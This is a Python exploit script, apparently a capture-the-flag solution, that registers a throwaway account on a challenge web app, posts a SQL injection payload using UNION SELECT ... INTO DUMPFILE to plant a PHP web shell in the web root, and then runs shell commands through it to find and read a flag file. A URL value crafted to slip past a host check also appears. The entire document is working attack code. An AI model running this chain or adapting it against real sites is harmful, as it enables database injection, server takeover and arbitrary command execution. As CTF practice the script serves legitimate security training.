import requests
import random
import string

web_shell = """
<?php
    system($_GET['cmd'] . ' 2>&1');
?>
"""
raw_bytes = web_shell.encode('utf-8')
hex_data = raw_bytes.hex()

challenge = "94.237.53.18:49311"
payload = f"' UNION SELECT null,null,null,null,0x{hex_data} INTO DUMPFILE '/var/www/html/shell.php';-- -"

# Function to generate random credentials
def generate_random_credentials():
    username = ''.join(random.choices(string.ascii_letters + string.digits, k=8))  # 8 char username
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))  # 12 char password
    return username, password

# Start a session
session = requests.Session()

# Define target URL for registration and login
register_url = f"http://{challenge}/register.php"
login_url = f"http://{challenge}/login.php"
rename = f"http://{challenge}/communicate.php"
home = f"http://{challenge}"

# Generate random credentials
username, password = generate_random_credentials()

# Register with random credentials
register_data = {
    "name": username,
    "username": username,
    "password": password,
}

# Perform registration
register_response = session.post(register_url, data=register_data)

# Log in with the registered credentials
login_data = {
    "username": username,
    "password": password
}

# Perform login
login_response = session.post(login_url, data=login_data)

# Now perform the original action (posting the form data)
form_data = {
    "url": "x://127.0.0.1:80;motherland.com:80",
    "data[new_name]": payload,
    "data[action]": "edit"
}

response = session.post(rename, data=form_data, proxies={'http':'http://localhost:8080'})

# Then refresh the homepage
response = session.get(home)

print('payload=',payload)
print('response:', response.text)
print(f"Access this with login for:\nuser: {username}\npassword: {password}")

# Then RCE
response = session.get(home + '/shell.php?cmd=ls /')

import re
pattern = r'[0-9a-f]+_flag\.txt'

match = re.search(pattern, response.text)
response = session.get(home + f'/shell.php?cmd=cat /{match.group()}')
print(f"\nHere's your flag: {response.text}")